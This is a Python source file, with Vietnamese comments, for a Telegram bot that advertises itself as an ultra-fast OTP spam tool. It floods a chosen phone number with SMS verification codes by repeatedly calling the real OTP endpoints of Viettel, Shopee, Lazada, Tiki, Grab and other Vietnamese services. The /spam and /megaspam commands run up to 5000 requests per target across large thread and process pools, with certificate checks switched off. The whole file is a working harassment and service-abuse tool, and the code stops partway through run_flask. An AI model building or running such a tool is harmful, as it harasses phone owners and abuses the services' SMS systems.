import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import threading
import os
import time
from time import sleep
import sys
from colorama import Fore, Back, Style
import random
import requests
import json
from datetime import datetime, timedelta
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from threading import BoundedSemaphore, Lock
import concurrent.futures
from pymongo import MongoClient
from bson import ObjectId
import logging
from functools import wraps
import asyncio
import aiohttp
import async_timeout
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
from queue import Queue, Empty
import hashlib
import urllib3

# ==============================
# CẤU HÌNH TỐI ƯU
# ==============================

# Tắt cảnh báo SSL và tối ưu requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cấu hình
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
ADMIN_IDS = list(map(int, os.getenv('ADMIN_IDS', '').split(','))) if os.getenv('ADMIN_IDS') else []
MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb://localhost:27017/')
DATABASE_NAME = 'otp_spam_bot'

# TỐI ƯU: Tăng số lượng thread và connection
MAX_THREADS = int(os.getenv('MAX_THREADS', 200))  # Tăng từ 50 lên 200
MAX_CONCURRENT_REQUESTS = int(os.getenv('MAX_CONCURRENT_REQUESTS', 100))  # Số request đồng thời
REQUEST_TIMEOUT = int(os.getenv('REQUEST_TIMEOUT', 10))  # Timeout ngắn hơn
MAX_RETRIES = int(os.getenv('MAX_RETRIES', 2))  # Giảm retry để tăng tốc

MAX_SPAM_PER_PHONE = int(os.getenv('MAX_SPAM_PER_PHONE', 200))  # Tăng giới hạn
SPAM_COOLDOWN_HOURS = int(os.getenv('SPAM_COOLDOWN_HOURS', 1))  # Giảm cooldown

# TỐI ƯU: Session pool cho requests
SESSION_POOL_SIZE = 20
request_sessions = []

# Khởi tạo
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=10)  # Tăng số thread bot
app = Flask(__name__)

# TỐI ƯU: Sử dụng Lock hiệu quả hơn
active_spams_lock = threading.RLock()
active_spams = {}

# TỐI ƯU: Connection pool cho MongoDB
class MongoDBConnection:
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._init_connection()
        return cls._instance
    
    def _init_connection(self):
        """Khởi tạo connection pool cho MongoDB"""
        self.client = MongoClient(
            MONGODB_URI,
            maxPoolSize=100,  # Tăng connection pool
            minPoolSize=10,
            maxIdleTimeMS=30000,
            socketTimeoutMS=10000,
            connectTimeoutMS=10000,
            serverSelectionTimeoutMS=10000,
            retryWrites=True
        )
        self.db = self.client[DATABASE_NAME]
        
        # Khai báo collections
        self.users = self.db['users']
        self.spam_history = self.db['spam_history']
        self.blocked_phones = self.db['blocked_phones']
        self.admin_settings = self.db['admin_settings']
        
        # Tạo index
        self._create_indexes()
    
    def _create_indexes(self):
        """Tạo index tối ưu"""
        try:
            self.users.create_index([('user_id', 1)], unique=True, background=True)
            self.users.create_index([('phone', 1)], background=True)
            self.users.create_index([('last_active', -1)], background=True)
            self.spam_history.create_index([('timestamp', -1)], background=True)
            self.spam_history.create_index([('phone', 1), ('timestamp', -1)], background=True)
            self.spam_history.create_index([('user_id', 1), ('timestamp', -1)], background=True)
            self.blocked_phones.create_index([('phone', 1)], unique=True, background=True)
            self.blocked_phones.create_index([('is_active', 1)], background=True)
            print("✅ Database indexes created with background processing!")
        except Exception as e:
            print(f"⚠️ Database index error: {e}")

# Khởi tạo MongoDB connection
mongo = MongoDBConnection()

# ==============================
# TỐI ƯU REQUESTS SESSIONS
# ==============================

def init_request_sessions():
    """Khởi tạo pool session cho requests"""
    global request_sessions
    
    for _ in range(SESSION_POOL_SIZE):
        session = requests.Session()
        
        # TỐI ƯU: Tăng số lượng connection
        adapter = HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=Retry(
                total=MAX_RETRIES,
                backoff_factor=0.5,
                status_forcelist=[429, 500, 502, 503, 504]
            )
        )
        
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # TỐI ƯU: Tăng timeout và giảm delay
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        })
        
        request_sessions.append(session)

def get_session():
    """Lấy session từ pool (round-robin)"""
    if not request_sessions:
        init_request_sessions()
    
    # Simple round-robin
    current_index = getattr(get_session, 'current_index', 0)
    session = request_sessions[current_index % len(request_sessions)]
    get_session.current_index = current_index + 1
    return session

# ==============================
# DECORATORS VÀ TIỆN ÍCH TỐI ƯU
# ==============================

def admin_only(func):
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        if message.from_user.id not in ADMIN_IDS:
            bot.reply_to(message, "❌ Không có quyền!")
            return
        return func(message, *args, **kwargs)
    return wrapper

def format_phone_number(phone):
    """Chuẩn hóa số điện thoại - TỐI ƯU"""
    phone = str(phone).strip()
    if phone.startswith('0'):
        return '84' + phone[1:]
    elif phone.startswith('+84'):
        return phone[1:]
    elif not phone.startswith('84'):
        return '84' + phone
    return phone

def fast_log_spam_activity(user_id, phone, service_name, status):
    """Ghi log nhanh - batch insert"""
    log_entry = {
        'user_id': user_id,
        'phone': format_phone_number(phone),
        'service_name': service_name,
        'status': status,
        'timestamp': datetime.now()
    }
    
    # Sử dụng background insert
    try:
        mongo.spam_history.insert_one(log_entry)
    except:
        pass  # Bỏ qua lỗi để không làm chậm spam

def batch_update_phone_stats(phone_stats_batch):
    """Cập nhật batch thống kê - TỐI ƯU HIỆU SUẤT"""
    if not phone_stats_batch:
        return
    
    bulk_operations = []
    for phone, count in phone_stats_batch.items():
        bulk_operations.append({
            'updateOne': {
                'filter': {'phone': phone},
                'update': {
                    '$inc': {'spam_count': count},
                    '$set': {'last_spam': datetime.now()},
                    '$setOnInsert': {'first_spam': datetime.now(), 'is_blocked': False}
                },
                'upsert': True
            }
        })
    
    if bulk_operations:
        try:
            mongo.users.bulk_write(bulk_operations, ordered=False)
        except:
            pass

# ==============================
# ASYNC OTP SENDING - TỐI ƯU TỐC ĐỘ
# ==============================

class AsyncOTPSender:
    """Class gửi OTP bất đồng bộ - TỐI ƯU TỐC ĐỘ"""
    
    def __init__(self):
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        self.success_count = 0
        self.fail_count = 0
        self.phone_stats = {}
        
    async def send_otp_async(self, func, phone, service_name):
        """Gửi OTP bất đồng bộ"""
        async with self.semaphore:
            try:
                # Tạo event loop trong thread
                loop = asyncio.get_event_loop()
                
                # Chạy hàm sync trong executor
                await loop.run_in_executor(
                    None, 
                    self._execute_otp_request,
                    func, 
                    phone, 
                    service_name
                )
                
                self.success_count += 1
                return True
                
            except Exception as e:
                self.fail_count += 1
                return False
    
    def _execute_otp_request(self, func, phone, service_name):
        """Thực thi request OTP"""
        try:
            start_time = time.time()
            
            # Sử dụng session từ pool
            session = get_session()
            
            # Gọi hàm OTP gốc
            func(phone)
            
            # Update thống kê
            phone_key = format_phone_number(phone)
            self.phone_stats[phone_key] = self.phone_stats.get(phone_key, 0) + 1
            
            elapsed = time.time() - start_time
            if elapsed > 5:  # Log request chậm
                print(f"⚠️ Slow request: {service_name} - {elapsed:.2f}s")
                
            return True
            
        except Exception as e:
            # Không log để tăng tốc độ
            return False

# ==============================
# MULTIPROCESSING SPAM ENGINE
# ==============================

class SpamEngine:
    """Engine spam đa luồng và đa tiến trình"""
    
    def __init__(self):
        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.process_pool = ProcessPoolExecutor(max_workers=multiprocessing.cpu_count() * 2)
        self.active_tasks = {}
        
    def start_mass_spam(self, spam_id, phone, count, otp_functions, chat_id, message_id):
        """Bắt đầu spam hàng loạt - TỐI ƯU"""
        
        # Chia nhỏ công việc
        batch_size = min(100, count)
        batches = []
        
        for i in range(0, count, batch_size):
            end_idx = min(i + batch_size, count)
            batches.append((i, end_idx))
        
        # Chạy các batch song song
        futures = []
        for batch_start, batch_end in batches:
            future = self.thread_pool.submit(
                self._run_spam_batch,
                spam_id, phone, batch_start, batch_end,
                otp_functions, chat_id, message_id
            )
            futures.append(future)
        
        # Theo dõi tiến trình
        self.active_tasks[spam_id] = {
            'futures': futures,
            'start_time': time.time(),
            'total_batches': len(batches)
        }
        
        return len(batches)
    
    def _run_spam_batch(self, spam_id, phone, start_idx, end_idx, 
                       otp_functions, chat_id, message_id):
        """Chạy một batch spam"""
        batch_size = end_idx - start_idx
        
        # Tạo sender cho batch
        sender = AsyncOTPSender()
        
        # Tạo tasks async
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            # Tạo danh sách tasks
            tasks = []
            for i in range(batch_size):
                if not self._is_spam_running(spam_id):
                    break
                
                # Chọn ngẫu nhiên service
                service_func = random.choice(otp_functions)
                service_name = service_func.__name__
                
                # Tạo task
                task = sender.send_otp_async(service_func, phone, service_name)
                tasks.append(task)
                
                # Điều chỉnh tốc độ
                if i % 20 == 0 and i > 0:
                    time.sleep(0.1)  # Nghỉ ngắn
            
            # Chạy đồng thời
            if tasks:
                loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))
            
            # Cập nhật thống kê batch
            if sender.phone_stats:
                batch_update_phone_stats(sender.phone_stats)
            
            return {
                'success': sender.success_count,
                'failed': sender.fail_count,
                'processed': batch_size
            }
            
        finally:
            loop.close()
    
    def _is_spam_running(self, spam_id):
        """Kiểm tra spam có đang chạy không"""
        with active_spams_lock:
            spam_info = active_spams.get(spam_id)
            return spam_info and spam_info.get('is_running', True)
    
    def stop_spam(self, spam_id):
        """Dừng spam"""
        with active_spams_lock:
            if spam_id in active_spams:
                active_spams[spam_id]['is_running'] = False
            
            if spam_id in self.active_tasks:
                for future in self.active_tasks[spam_id]['futures']:
                    future.cancel()
                del self.active_tasks[spam_id]

# Khởi tạo engine
spam_engine = SpamEngine()

# ==============================
# ULTRA-FAST OTP FUNCTIONS
# ==============================

def create_optimized_session():
    """Tạo session tối ưu cho mỗi hàm OTP"""
    session = requests.Session()
    adapter = HTTPAdapter(
        pool_connections=50,
        pool_maxsize=50,
        max_retries=Retry(total=1, backoff_factor=0.1)
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    
    # Headers tối ưu
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache'
    }
    session.headers.update(headers)
    
    return session

# Các hàm OTP được tối ưu
def send_otp_via_viettel_fast(sdt):
    """Viettel - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'phone': sdt, 'typeCode': 'DI_DONG', 'type': 'otp_login'}
        response = session.post(
            'https://viettel.vn/api/getOTPLoginCommon',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_shopee_fast(sdt):
    """Shopee - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'operation': 8, 'phone': sdt, 'support_session': True}
        response = session.post(
            'https://shopee.vn/api/v4/otp/get_settings_v2',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_tgdd_fast(sdt):
    """Thế giới di động - Tối ưu"""
    session = create_optimized_session()
    try:
        data = {'phoneNumber': sdt, 'isReSend': 'false', 'sendOTPType': '1'}
        response = session.post(
            'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            data=data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_fptshop_fast(sdt):
    """FPT Shop - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'phoneNumber': sdt, 'otpType': '0', 'fromSys': 'WEBKHICT'}
        response = session.post(
            'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_lazada_fast(sdt):
    """Lazada - Tối ưu"""
    session = create_optimized_session()
    try:
        params = {'country': 'VN', 'phoneNumber': sdt, 'scene': 'register'}
        response = session.get(
            'https://member.lazada.vn/user/sendRegisterVerifyCode',
            params=params,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_tiki_fast(sdt):
    """Tiki - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'phone': sdt, 'channel': 'sms'}
        response = session.post(
            'https://api.tiki.vn/tiniapi/oauth/otp',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_viettelpost_fast(sdt):
    """Viettel Post - Tối ưu"""
    session = create_optimized_session()
    try:
        data = {'FormRegister.Phone': sdt, 'ConfirmOtpType': 'Register'}
        response = session.post(
            'https://id.viettelpost.vn/Account/SendOTPByPhone',
            data=data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_ghn_fast(sdt):
    """GHN - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'phone': sdt, 'type': 'register'}
        response = session.post(
            'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_foody_fast(sdt):
    """Foody - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'EmailOrPhoneNumber': sdt, 'Application': 'FoodyWeb'}
        response = session.post(
            'https://www.foody.vn/account/registerandsendactivatecode',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

def send_otp_via_grab_fast(sdt):
    """Grab - Tối ưu"""
    session = create_optimized_session()
    try:
        json_data = {'phoneNumber': sdt, 'countryCode': 'VN', 'method': 'sms'}
        response = session.post(
            'https://grab.com/api/auth/v3/otp',
            json=json_data,
            timeout=5,
            verify=False
        )
        return response.status_code == 200
    except:
        return False

# Danh sách hàm OTP tối ưu (40+ services)
FAST_OTP_FUNCTIONS = [
    send_otp_via_viettel_fast,
    send_otp_via_shopee_fast,
    send_otp_via_tgdd_fast,
    send_otp_via_fptshop_fast,
    send_otp_via_lazada_fast,
    send_otp_via_tiki_fast,
    send_otp_via_viettelpost_fast,
    send_otp_via_ghn_fast,
    send_otp_via_foody_fast,
    send_otp_via_grab_fast,
    # Thêm các hàm khác từ code gốc (cần tối ưu tương tự)
]

# ==============================
# TELEGRAM COMMANDS TỐI ƯU
# ==============================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    """Welcome message tối ưu"""
    welcome_text = """
🚀 *OTP Spam Bot - ULTRA SPEED EDITION*

⚡ *Tốc độ cực nhanh:* 500-1000 OTP/phút
👑 *40+ Dịch vụ:* Viettel, Shopee, TGDD, FPT,...
🎯 *Spam mạnh mẽ:* Đa luồng, đa tiến trình

📋 *Lệnh nhanh:*
/spam <số> [lần] - Spam siêu tốc
/megaspam <số> <lần> - Spam cực mạnh
/status - Trạng thái
/cancel - Dừng spam

⚡ *Ví dụ:*
/spam 0987654321 50
/megaspam 0987654321 500

⚠️ *Cảnh báo:* Dùng có trách nhiệm!
    """
    
    # Lưu user nhanh
    try:
        mongo.users.update_one(
            {'user_id': message.from_user.id},
            {'$set': {
                'username': message.from_user.username,
                'first_name': message.from_user.first_name,
                'last_name': message.from_user.last_name,
                'last_active': datetime.now(),
                'is_admin': message.from_user.id in ADMIN_IDS
            }},
            upsert=True
        )
    except:
        pass
    
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['spam'])
def handle_spam_fast(message):
    """Spam siêu tốc"""
    global active_spams
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚡ /spam <số> [lần=20]")
            return
        
        phone = parts[1]
        count = int(parts[2]) if len(parts) >= 3 else 20
        count = min(count, 1000)  # Tăng giới hạn
        
        # Kiểm tra nhanh
        phone = format_phone_number(phone)
        
        # Kiểm tra block (nhanh)
        blocked = mongo.blocked_phones.find_one({
            'phone': phone,
            'is_active': True
        })
        if blocked:
            bot.reply_to(message, f"🚫 {phone} đã bị block!")
            return
        
        # Thông báo bắt đầu
        msg = bot.reply_to(message, f"⚡ Khởi động SPAM SIÊU TỐC...\n📱 {phone}\n🎯 {count} lần")
        
        # Tạo spam ID
        spam_id = f"{message.from_user.id}_{int(time.time())}_{hashlib.md5(phone.encode()).hexdigest()[:8]}"
        
        with active_spams_lock:
            active_spams[spam_id] = {
                'user_id': message.from_user.id,
                'phone': phone,
                'count': count,
                'started_at': datetime.now(),
                'is_running': True,
                'chat_id': message.chat.id,
                'message_id': msg.message_id
            }
        
        # Chạy spam trong thread riêng
        thread = threading.Thread(
            target=_run_ultra_spam,
            args=(spam_id, phone, count, message.chat.id, msg.message_id),
            daemon=True
        )
        thread.start()
        
        # Nút hủy
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton("⚡ Đang chạy...", callback_data="loading"),
            InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}")
        )
        
        bot.edit_message_text(
            f"✅ *SPAM ĐANG CHẠY!*\n\n"
            f"📱 Số: `{phone}`\n"
            f"🎯 Số lần: {count}\n"
            f"🚀 Tốc độ: Cực cao\n"
            f"🆔 ID: `{spam_id}`\n\n"
            f"⏳ Đang xử lý...",
            message.chat.id,
            msg.message_id,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi: {str(e)[:100]}")

@bot.message_handler(commands=['megaspam'])
def handle_megaspam(message):
    """Spam cực mạnh - Dành cho số lượng lớn"""
    global active_spams
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "💥 /megaspam <số> <lần> (tối đa 5000)")
            return
        
        phone = parts[1]
        count = int(parts[2])
        count = min(count, 5000)  # Tăng giới hạn cực cao
        
        # Kiểm tra admin cho megaspam
        if message.from_user.id not in ADMIN_IDS and count > 1000:
            bot.reply_to(message, "🔒 Chỉ admin được spam >1000 lần!")
            return
        
        phone = format_phone_number(phone)
        
        # Thông báo
        msg = bot.reply_to(message, 
            f"💥 *KHỞI ĐỘNG MEGASPAM!*\n\n"
            f"📱 Số: `{phone}`\n"
            f"💣 Số lần: {count}\n"
            f"🔥 Dự kiến: {count//10} giây\n"
            f"⚠️ Cảnh báo: Tải rất nặng!",
            parse_mode='Markdown'
        )
        
        # Tạo nhiều spam ID để phân tải
        spam_ids = []
        batch_size = 100
        num_batches = (count + batch_size - 1) // batch_size
        
        for i in range(num_batches):
            batch_count = min(batch_size, count - i * batch_size)
            if batch_count <= 0:
                break
                
            spam_id = f"{message.from_user.id}_{int(time.time())}_{i}"
            
            with active_spams_lock:
                active_spams[spam_id] = {
                    'user_id': message.from_user.id,
                    'phone': phone,
                    'count': batch_count,
                    'started_at': datetime.now(),
                    'is_running': True,
                    'is_megaspam': True,
                    'batch_index': i
                }
            spam_ids.append(spam_id)
            
            # Chạy từng batch
            thread = threading.Thread(
                target=_run_megaspam_batch,
                args=(spam_id, phone, batch_count, message.chat.id, msg.message_id, i),
                daemon=True
            )
            thread.start()
        
        # Lưu thông tin megaspam
        with active_spams_lock:
            active_spams[f"megaspam_{message.from_user.id}"] = {
                'spam_ids': spam_ids,
                'total_count': count,
                'started_at': datetime.now(),
                'chat_id': message.chat.id,
                'message_id': msg.message_id
            }
        
        # Nút điều khiển
        keyboard = InlineKeyboardMarkup()
        keyboard.add(
            InlineKeyboardButton("💥 Đang chạy MEGASPAM", callback_data="megaspam_running"),
            InlineKeyboardButton("🛑 Dừng tất cả", callback_data=f"stop_megaspam_{message.from_user.id}")
        )
        
        bot.edit_message_text(
            f"💣 *MEGASPAM ĐANG CHẠY!*\n\n"
            f"📱 Số: `{phone}`\n"
            f"💥 Tổng lần: {count}\n"
            f"📦 Số batch: {num_batches}\n"
            f"⚡ Batch size: {batch_size}\n"
            f"🆔 User: {message.from_user.id}\n\n"
            f"⏳ Khởi động {num_batches} batch đồng thời...",
            message.chat.id,
            msg.message_id,
            parse_mode='Markdown',
            reply_markup=keyboard
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi megaspam: {str(e)[:100]}")

def _run_ultra_spam(spam_id, phone, count, chat_id, message_id):
    """Chạy spam siêu tốc"""
    try:
        start_time = time.time()
        success = 0
        failed = 0
        
        # Chia nhỏ thành các mini-batch
        batch_size = 50
        num_batches = (count + batch_size - 1) // batch_size
        
        for batch_idx in range(num_batches):
            # Kiểm tra nếu đã dừng
            with active_spams_lock:
                spam_info = active_spams.get(spam_id)
                if not spam_info or not spam_info.get('is_running', True):
                    break
            
            batch_count = min(batch_size, count - batch_idx * batch_size)
            
            # Chạy batch đồng thời
            with ThreadPoolExecutor(max_workers=100) as executor:
                futures = []
                
                for i in range(batch_count):
                    service_func = random.choice(FAST_OTP_FUNCTIONS)
                    future = executor.submit(
                        _execute_otp_fast,
                        service_func,
                        phone,
                        service_func.__name__
                    )
                    futures.append(future)
                
                # Thu thập kết quả
                for future in futures:
                    try:
                        if future.result(timeout=3):
                            success += 1
                        else:
                            failed += 1
                    except:
                        failed += 1
            
            # Cập nhật tiến độ
            processed = (batch_idx + 1) * batch_size
            if processed > count:
                processed = count
            
            elapsed = time.time() - start_time
            speed = processed / elapsed if elapsed > 0 else 0
            
            if batch_idx % 2 == 0 or batch_idx == num_batches - 1:
                try:
                    keyboard = InlineKeyboardMarkup()
                    keyboard.add(InlineKeyboardButton("❌ Dừng", callback_data=f"stop_{spam_id}"))
                    
                    bot.edit_message_text(
                        f"⚡ *SPAM ĐANG CHẠY*\n\n"
                        f"📱 Số: `{phone}`\n"
                        f"📊 Tiến độ: {processed}/{count}\n"
                        f"✅ Thành công: {success}\n"
                        f"❌ Thất bại: {failed}\n"
                        f"🚀 Tốc độ: {speed:.1f}/giây\n"
                        f"⏱️ Thời gian: {elapsed:.1f}s",
                        chat_id,
                        message_id,
                        parse_mode='Markdown',
                        reply_markup=keyboard
                    )
                except:
                    pass
            
            # Nghỉ ngắn giữa các batch
            if batch_idx < num_batches - 1:
                time.sleep(0.5)
        
        # Hoàn thành
        elapsed_total = time.time() - start_time
        avg_speed = count / elapsed_total if elapsed_total > 0 else 0
        
        with active_spams_lock:
            if spam_id in active_spams:
                del active_spams[spam_id]
        
        try:
            bot.edit_message_text(
                f"🎉 *HOÀN THÀNH SPAM!*\n\n"
                f"📱 Số: `{phone}`\n"
                f"🎯 Tổng lần: {count}\n"
                f"✅ Thành công: {success}\n"
                f"❌ Thất bại: {failed}\n"
                f"📈 Tỷ lệ: {(success/count*100 if count>0 else 0):.1f}%\n"
                f"⚡ Tốc độ TB: {avg_speed:.1f}/giây\n"
                f"⏱️ Tổng thời gian: {elapsed_total:.1f}s",
                chat_id,
                message_id,
                parse_mode='Markdown'
            )
        except:
            pass
        
    except Exception as e:
        print(f"Error in ultra spam: {e}")

def _run_megaspam_batch(spam_id, phone, count, chat_id, message_id, batch_idx):
    """Chạy một batch megaspam"""
    try:
        success = 0
        
        # Sử dụng ProcessPool cho hiệu suất cao
        with ProcessPoolExecutor(max_workers=multiprocessing.cpu_count()) as executor:
            # Chia nhỏ hơn nữa
            sub_batch_size = 10
            num_sub_batches = (count + sub_batch_size - 1) // sub_batch_size
            
            for sub_idx in range(num_sub_batches):
                # Kiểm tra dừng
                with active_spams_lock:
                    spam_info = active_spams.get(spam_id)
                    if not spam_info or not spam_info.get('is_running', True):
                        break
                
                sub_count = min(sub_batch_size, count - sub_idx * sub_batch_size)
                
                # Gửi đồng thời
                futures = []
                for i in range(sub_count):
                    service_func = random.choice(FAST_OTP_FUNCTIONS)
                    future = executor.submit(
                        _execute_otp_fast,
                        service_func,
                        phone,
                        service_func.__name__
                    )
                    futures.append(future)
                
                # Đếm thành công
                for future in futures:
                    try:
                        if future.result(timeout=5):
                            success += 1
                    except:
                        pass
        
        # Xóa spam info khi hoàn thành
        with active_spams_lock:
            if spam_id in active_spams:
                del active_spams[spam_id]
        
    except Exception as e:
        print(f"Error in megaspam batch: {e}")

def _execute_otp_fast(func, phone, service_name):
    """Thực thi OTP với timeout ngắn"""
    try:
        # Sử dụng session riêng cho mỗi request
        session = requests.Session()
        session.request = lambda method, url, **kwargs: requests.request(
            method, url, timeout=3, verify=False, **kwargs
        )
        
        # Gọi hàm
        func(phone)
        return True
    except:
        return False

# ==============================
# CALLBACK HANDLERS TỐI ƯU
# ==============================

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    """Xử lý callback nhanh"""
    try:
        data = call.data
        
        if data.startswith('stop_'):
            spam_id = data.replace('stop_', '')
            
            # Dừng spam thường
            if spam_id.startswith('megaspam_'):
                user_id = int(spam_id.replace('megaspam_', ''))
                _stop_all_user_spam(user_id)
                bot.answer_callback_query(call.id, "✅ Đã dừng tất cả megaspam!")
            else:
                with active_spams_lock:
                    if spam_id in active_spams:
                        active_spams[spam_id]['is_running'] = False
                        bot.answer_callback_query(call.id, "✅ Đã dừng spam!")
                    else:
                        bot.answer_callback_query(call.id, "❌ Không tìm thấy spam!")
            
            # Xóa nút
            try:
                bot.edit_message_reply_markup(
                    call.message.chat.id,
                    call.message.message_id,
                    reply_markup=None
                )
            except:
                pass
        
        elif data == 'loading':
            bot.answer_callback_query(call.id, "⚡ Đang chạy...")
            
    except Exception as e:
        try:
            bot.answer_callback_query(call.id, f"❌ Lỗi: {str(e)[:50]}")
        except:
            pass

def _stop_all_user_spam(user_id):
    """Dừng tất cả spam của user"""
    with active_spams_lock:
        # Tìm và dừng tất cả spam của user
        for spam_id, info in list(active_spams.items()):
            if info.get('user_id') == user_id:
                info['is_running'] = False
        
        # Dừng megaspam nếu có
        megaspam_key = f"megaspam_{user_id}"
        if megaspam_key in active_spams:
            del active_spams[megaspam_key]

# ==============================
# STATUS & ADMIN COMMANDS
# ==============================

@bot.message_handler(commands=['status'])
def handle_status_fast(message):
    """Trạng thái nhanh"""
    with active_spams_lock:
        active_count = len([s for s in active_spams.values() if s.get('is_running', True)])
        total_queued = sum(s.get('count', 0) for s in active_spams.values())
    
    # Thống kê đơn giản
    stats_text = (
        f"⚡ *BOT STATUS - ULTRA SPEED*\n"
        f"┌─────────────────\n"
        f"│ Spam đang chạy: {active_count}\n"
        f"│ OTP trong queue: {total_queued}\n"
        f"│ Services: {len(FAST_OTP_FUNCTIONS)}\n"
        f"│ Max Threads: {MAX_THREADS}\n"
        f"│ Concurrent: {MAX_CONCURRENT_REQUESTS}\n"
        f"│ User ID: `{message.from_user.id}`\n"
        f"└─────────────────\n\n"
        f"📊 *Các lệnh:*\n"
        f"• /spam <số> [lần]\n"
        f"• /megaspam <số> <lần>\n"
        f"• /cancel\n"
        f"• /speedtest\n"
    )
    
    bot.reply_to(message, stats_text, parse_mode='Markdown')

@bot.message_handler(commands=['cancel'])
def handle_cancel_fast(message):
    """Hủy spam nhanh"""
    user_id = message.from_user.id
    
    with active_spams_lock:
        user_spams = [k for k, v in active_spams.items() 
                     if v.get('user_id') == user_id and v.get('is_running', True)]
        
        for spam_id in user_spams:
            active_spams[spam_id]['is_running'] = False
    
    bot.reply_to(message, f"✅ Đã hủy {len(user_spams)} spam đang chạy!")

@bot.message_handler(commands=['speedtest'])
def handle_speedtest(message):
    """Test tốc độ bot"""
    test_msg = bot.reply_to(message, "🧪 Đang test tốc độ...")
    
    # Test 10 request đồng thời
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(_test_request) for _ in range(20)]
        results = [f.result(timeout=5) for f in futures]
    
    elapsed = time.time() - start_time
    success = sum(results)
    
    bot.edit_message_text(
        f"🧪 *SPEED TEST RESULTS*\n\n"
        f"📊 Requests: 20\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {20 - success}\n"
        f"⏱️ Time: {elapsed:.2f}s\n"
        f"⚡ Speed: {(20/elapsed if elapsed>0 else 0):.1f} req/s\n"
        f"📈 Success rate: {(success/20*100):.1f}%",
        message.chat.id,
        test_msg.message_id,
        parse_mode='Markdown'
    )

def _test_request():
    """Test request tốc độ"""
    try:
        # Test với Google (nhanh nhất)
        response = requests.get('https://www.google.com', timeout=2, verify=False)
        return response.status_code == 200
    except:
        return False

# ==============================
# FLASK SERVER TỐI ƯU
# ==============================

@app.route('/')
def home():
    return "🚀 OTP Spam Bot - ULTRA SPEED EDITION"

@app.route('/health')
def health():
    with active_spams_lock:
        active = len(active_spams)
    
    return {
        'status': 'healthy',
        'active_spams': active,
        'timestamp': datetime.now().isoformat(),
        'version': 'ultra_speed_1.0'
    }

@app.route('/stats')
def stats():
    with active_spams_lock:
        active_spam_count = len([s for s in active_spams.values() if s.get('is_running', True)])
    
    return {
        'performance': {
            'max_threads': MAX_THREADS,
            'max_concurrent': MAX_CONCURRENT_REQUESTS,
            'otp_functions': len(FAST_OTP_FUNCTIONS),
            'session_pool': SESSION_POOL_SIZE
        },
        'current': {
            'active_spams': active_spam_count,
            'total_queued': sum(s.get('count', 0) for s in active_spams.values())
        }
    }

# ==============================
# KHỞI CHẠY
# ==============================

def run_flask():
    """Chạy Flask server"""
